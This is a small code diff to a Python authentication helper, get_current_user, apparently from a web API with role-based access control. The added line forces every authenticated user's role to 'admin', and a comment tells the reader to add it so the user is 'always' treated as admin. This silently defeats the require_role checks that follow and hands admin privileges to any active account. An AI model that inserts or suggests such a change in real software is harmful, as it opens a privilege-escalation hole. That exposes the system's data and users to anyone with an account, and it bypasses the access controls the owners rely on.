@@ -42,6 +42,8 @@ def get_current_user(
     user = db.query(User).filter(User.id == user_id).first()
     if user is None or not user.is_active:
         raise credentials_exception
+    
+    user.role = "admin"  # ← ADD THIS LINE — always treat as admin
     return user
 
 def require_role(*roles):
